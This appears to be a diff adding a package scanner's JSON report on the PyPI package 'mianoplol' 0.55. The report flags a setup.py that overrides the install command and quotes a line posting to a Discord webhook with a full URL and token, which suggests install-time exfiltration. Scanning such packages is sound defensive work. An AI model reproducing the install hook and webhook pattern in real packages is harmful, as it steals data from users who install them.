@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:19",
+                "code": "setup(\n  name = 'mianoplol',\n  packages=find_packages(),\n  version = '0.55',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\"],\n  cmdclass={\n    'install': CustomInstallCommand... = [],\n\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": {},
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:10",
+                "code": "          webhook = Webhook.from_url('https://discord.com/api/webhooks/1040010700677988502/-NIIPOoDdImwivYH43PiNxcvlGho7Dt1lZg3IG7U4IZbvkq7eQj6d_5eYqyFDjVo88wB', adapter=AsyncWebhookAdapter(session))\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/mianoplol-0.55"
+}
